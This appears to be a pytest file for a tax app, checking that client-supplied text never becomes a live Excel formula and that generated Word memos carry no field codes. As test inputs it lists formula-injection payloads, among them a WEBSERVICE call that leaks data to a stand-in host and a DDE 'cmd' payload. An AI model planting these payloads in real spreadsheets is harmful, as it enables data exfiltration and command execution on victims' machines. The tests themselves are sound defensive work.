"""Task 44 (SECURITY): a client's text never becomes a live formula in a workbook, and
the memo carries no field codes."""

from __future__ import annotations

import zipfile

from openpyxl import Workbook, load_workbook

from app.gateway import documents
from app.gateway.documents import append_books, append_revenue, save_literal

EVIL = '=WEBSERVICE("http://x.test/?leak=1")'
STARTS = [EVIL, '=HYPERLINK("http://x.test","click")', "+1+cmd|' /C calc'!A0",
          "-2+3", "@SUM(1)", "\t=1+1", "\r=1+1"]


def _formula_free(path):
    wb = load_workbook(path)
    try:
        cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    finally:
        wb.close()
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    return cells


def test_the_workpaper_stores_a_formula_like_quote_as_text(h, tmp_path):
    case_id = h.new_case()
    h.ok("extract_facts", case_id=case_id, incorporated_delaware=True, foreign_owner_25=False,
         quotes={"incorporated_delaware": "We're a Delaware C-corp",
                 "authorized_shares": "10,000,000", "issued_shares": "8,000,000",
                 "gross_assets": "$500k", "foreign_owner_25": "No foreign owners"})
    case = h.gw.state.cases[case_id]
    case.quotes["incorporated_delaware"] = EVIL  # as if the client had written it
    h.ok("compute_tax", case_id=case_id)
    h.ok("qa_check", case_id=case_id)
    h.ok("prepare_documents", case_id=case_id)
    sheet = next(h.gw.docs_dir(case_id).glob("*.xlsx"))
    cells = _formula_free(sheet)
    [quote] = [c for c in cells if c.value == EVIL]
    assert quote.data_type == "s" and quote.quotePrefix
    numbers = [c for c in cells if c.data_type == "n" and c.value is not None]
    assert numbers  # numbers stay numbers


def test_the_books_store_a_formula_like_label_as_text(tmp_path):
    books = tmp_path / "U-Tax_Books.xlsx"
    figures = documents.Figures(**{name: 0 for name in documents.Figures.__dataclass_fields__})
    for i, label in enumerate(STARTS):
        append_books(books, f"case_{i}", "2026-11-08", label, figures)
    append_revenue(books, "case_0:filing", "2026-11-08", EVIL, 4900)
    cells = _formula_free(books)
    for label in STARTS:
        assert [c for c in cells if c.value == label and c.data_type == "s"], label


def test_an_old_books_file_with_a_live_formula_heals_on_the_next_save(tmp_path):
    books = tmp_path / "U-Tax_Books.xlsx"
    wb = Workbook()
    wb.active.append(["Entry", "Date", "Client"])
    wb.active.append(["case_9", "2026-11-01", EVIL])  # written before the fix
    wb.save(books)
    assert load_workbook(books).active["C2"].data_type == "f"
    append_revenue(books, "case_9:filing", "2026-11-08", "Team #9", 4900)
    assert load_workbook(books).active["C2"].data_type == "s"


def test_save_literal_keeps_numbers(tmp_path):
    wb = Workbook()
    wb.active.append([12, 3.5, "plain", "-not a number"])
    save_literal(wb, tmp_path / "x.xlsx")
    row = load_workbook(tmp_path / "x.xlsx").active[1]
    assert [c.data_type for c in row] == ["n", "n", "s", "s"]


def test_the_memo_has_no_field_codes(h):
    case_id = h.to_qa_passed()
    memo = next(h.gw.docs_dir(case_id).glob("*.docx"))
    with zipfile.ZipFile(memo) as z:
        xml = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist()
                      if n.endswith(".xml"))
    for code in ("w:fldSimple", "w:instrText", "w:fldChar"):
        assert code not in xml
